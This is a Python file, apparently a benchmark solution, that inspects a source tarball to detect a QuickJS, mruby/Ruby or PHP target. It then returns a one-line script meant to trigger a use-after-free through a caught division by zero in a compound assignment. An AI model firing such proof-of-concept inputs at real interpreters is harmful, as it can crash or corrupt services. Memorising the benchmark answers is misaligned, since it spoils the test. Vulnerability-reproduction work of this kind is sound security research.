import os
import re
import tarfile
from typing import Optional, Tuple


class Solution:
    def _iter_text_files(self, tf: tarfile.TarFile, exts=(".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm")):
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            lname = name.lower()
            if not lname.endswith(exts) and "fuzz" not in lname and "harness" not in lname:
                continue
            if m.size <= 0:
                continue
            if m.size > 2_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            yield name, data

    def _detect_target(self, src_path: str) -> Tuple[str, dict]:
        info = {}
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = [m.name for m in tf.getmembers() if m.name]
                lnames = [n.lower() for n in names]

                def any_name(pred):
                    for n in lnames:
                        if pred(n):
                            return True
                    return False

                # Fast path by filenames
                if any_name(lambda n: n.endswith("quickjs.c") or n.endswith("qjs.c") or n.endswith("quickjs.h") or n.endswith("quickjs-libc.c")):
                    return "quickjs", info
                if any_name(lambda n: "mruby" in n and (n.endswith(".c") or n.endswith(".h") or n.endswith(".rb"))):
                    return "mruby", info
                if any_name(lambda n: n.startswith("zend/") or "/zend/" in n or n.startswith("sapi/") or "/php" in n):
                    # Might be PHP; confirm with symbols
                    pass

                # Harness/symbol scanning
                has_bigint_tokens = False
                php_eval = False
                php_file_exec = False

                quickjs_score = 0
                mruby_score = 0
                ruby_score = 0
                php_score = 0

                for _, data in self._iter_text_files(tf):
                    if not has_bigint_tokens and (b"BigInt" in data or b"BIGINT" in data or b"JS_TAG_BIG_INT" in data):
                        has_bigint_tokens = True

                    if b"LLVMFuzzerTestOneInput" in data or b"fuzzer" in data.lower() or b"Fuzz" in data:
                        pass

                    if b"JS_NewRuntime" in data or b"JS_NewContext" in data or b"JS_Eval" in data or b"quickjs.h" in data:
                        quickjs_score += 3
                    if b"mrb_open" in data or b"mrb_load_nstring" in data or b"mruby.h" in data or b"mrb_state" in data:
                        mruby_score += 3
                    if b"ruby_init" in data or b"rb_eval_string" in data or b"libruby" in data:
                        ruby_score += 2
                    if b"zend_eval_stringl" in data or b"zend_eval_string" in data:
                        php_score += 3
                        php_eval = True
                    if b"php_execute_script" in data or b"sapi_startup" in data or b"php_module_startup" in data:
                        php_score += 2
                        php_file_exec = True

                info["has_bigint"] = has_bigint_tokens
                info["php_eval"] = php_eval
                info["php_file_exec"] = php_file_exec

                # Decide based on scores
                if quickjs_score > max(mruby_score, ruby_score, php_score) and quickjs_score >= 3:
                    return "quickjs", info
                if mruby_score > max(quickjs_score, ruby_score, php_score) and mruby_score >= 3:
                    return "mruby", info
                if php_score > max(quickjs_score, mruby_score, ruby_score) and php_score >= 3:
                    return "php", info
                if ruby_score > 0 and ruby_score >= max(quickjs_score, mruby_score, php_score):
                    return "ruby", info

                # Secondary heuristics: directory names
                joined = " ".join(lnames)
                if "quickjs" in joined or "qjs" in joined:
                    return "quickjs", info
                if "mruby" in joined:
                    return "mruby", info
                if "zend" in joined or "php" in joined:
                    return "php", info

        except Exception:
            pass

        return "quickjs", info

    def solve(self, src_path: str) -> bytes:
        target, info = self._detect_target(src_path)

        if target == "quickjs":
            # BigInt division by zero throws; compound op path. Access after catch to trigger UAF if present.
            return b"var a=1n;try{a/=0n}catch(e){};a+=1n\n"

        if target in ("mruby", "ruby"):
            # Ruby integer division by zero raises; keep going and reuse variable.
            return b"a=1;begin;a/=0;rescue;end;a+=1\n"

        if target == "php":
            php_eval = bool(info.get("php_eval"))
            if php_eval:
                # zend_eval_stringl: no PHP tags
                return b"$a=1;try{$a/=0;}catch(Throwable $e){};$a+=1;\n"
            else:
                return b"<?php $a=1;try{$a/=0;}catch(Throwable $e){};$a+=1; ?>\n"

        return b"var a=1n;try{a/=0n}catch(e){};a+=1n\n"